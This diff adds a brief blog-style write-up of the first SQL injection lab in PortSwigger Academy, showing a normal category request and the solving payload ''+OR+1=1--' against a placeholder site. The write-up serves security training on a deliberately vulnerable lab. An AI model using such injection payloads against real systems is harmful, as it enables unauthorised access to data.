@@ -1,0 +1,26 @@
+---
+title: PortSwigger Academy - SQLi - Lab 1 - SQLi in WHERE clause
+date: 2023-03-02
+categories: [PortSwigger, Challenges]
+tags: [portswigger, web, sqli]
+---
+
+Difficulty : `Apprentice`
+
+## 🎯 Goal 
+
+Show all the products no matter the category.
+
+## ✅ Solution
+
+Initial request:
+
+````url
+<website>/products?category=Gifts
+````
+
+With payload:
+
+````url
+<website>/products?category='+OR+1=1--
+````
